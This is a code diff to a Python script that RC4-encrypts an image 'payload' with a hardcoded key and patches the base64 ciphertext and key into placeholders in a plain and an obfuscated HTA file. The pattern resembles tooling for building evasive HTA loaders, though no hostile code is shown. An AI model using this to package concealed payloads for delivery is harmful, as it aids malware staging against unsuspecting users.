@@ -7,7 +7,9 @@ RC4_KEY = b'-4S@aAv;&T~2\\.e+3])N`C|"\\.3FTVH8NG5O$Hjh+~s^g\'G06ni"n{E2cujo"w^ln
 
 ENC_B64_RE = re.compile(r'(var encB64 = ")[^"]*(";)')
 KEY_B64_RE = re.compile(r'(var keyB64 = ")[^"]*(";)')
-OBF_ENC_RE = re.compile(r"(\['Type',')(?:B64_ENC_DATA|[A-Za-z0-9+/=]+)(')")
+OBF_ENC_LEGACY_RE = re.compile(r"(\['Type',')(?:B64_ENC_DATA|[A-Za-z0-9+/=]+)(')")
+OBF_ENC_PLACEHOLDER = 'B64_ENC_DATA'
+OBF_KEY_PLACEHOLDER = 'KEY_B64_DATA'
 OBF_HTA_PATH = 'index-obf.hta'
 
 
@@ -36,7 +38,7 @@ def replace_blob(content, pattern, new_value):
     return pattern.sub(rf'\g<1>{new_value}\g<2>', content, count=1)
 
 
-def patch_obf_hta(b64_ct, hta_path=OBF_HTA_PATH):
+def patch_obf_hta(b64_ct, b64_key, hta_path=OBF_HTA_PATH):
     if not os.path.exists(hta_path):
         print(f"[!] File not found: {hta_path}")
         return 1
@@ -44,15 +46,29 @@ def patch_obf_hta(b64_ct, hta_path=OBF_HTA_PATH):
     with open(hta_path, 'r', encoding='utf-8') as f:
         obf = f.read()
 
-    updated = replace_blob(obf, OBF_ENC_RE, b64_ct)
-    if updated is None:
-        print(f"[!] Could not find B64_ENC_DATA placeholder in {hta_path}")
-        return 1
+    if OBF_ENC_PLACEHOLDER in obf or OBF_KEY_PLACEHOLDER in obf:
+        if OBF_ENC_PLACEHOLDER not in obf:
+            print(f"[!] Could not find {OBF_ENC_PLACEHOLDER!r} in {hta_path}")
+            return 1
+        if OBF_KEY_PLACEHOLDER not in obf:
+            print(f"[!] Could not find {OBF_KEY_PLACEHOLDER!r} in {hta_path}")
+            return 1
+        updated = obf.replace(OBF_ENC_PLACEHOLDER, b64_ct, 1)
+        updated = updated.replace(OBF_KEY_PLACEHOLDER, b64_key, 1)
+        print(f"[+] Updated {OBF_ENC_PLACEHOLDER} and {OBF_KEY_PLACEHOLDER} in {hta_path}")
+    else:
+        updated = replace_blob(obf, OBF_ENC_LEGACY_RE, b64_ct)
+        if updated is None:
+            print(
+                f"[!] Could not find {OBF_ENC_PLACEHOLDER!r} or legacy "
+                f"['Type',') ciphertext slot in {hta_path}"
+            )
+            return 1
+        print(f"[+] Updated legacy ciphertext slot in {hta_path}")
 
     with open(hta_path, 'w', encoding='utf-8', newline='') as f:
         f.write(updated)
 
-    print(f"[+] Updated B64_ENC_DATA in {hta_path}")
     return 0
 
 
@@ -64,7 +80,7 @@ def parse_args():
         '-O',
         '--obf',
         action='store_true',
-        help=f'Patch B64_ENC_DATA in {OBF_HTA_PATH}',
+        help=f'Patch B64_ENC_DATA / KEY_B64_DATA in {OBF_HTA_PATH}',
     )
     return parser.parse_args()
 
@@ -86,6 +102,7 @@ def main():
         pt = f.read()
 
     print(f"[*] Read {len(pt):,} bytes from {img_path}")
+    print(f"[*] Set EXPECTED_IMG_BYTES = {len(pt)} in script.js if the image size changed")
     print("[*] Encrypting payload...")
     ct = rc4(RC4_KEY, pt)
 
@@ -113,7 +130,7 @@ def main():
     print(f"[+] Updated image blobs in {hta_path}")
 
     if args.obf:
-        return patch_obf_hta(b64_ct)
+        return patch_obf_hta(b64_ct, b64_key)
 
     return 0
 
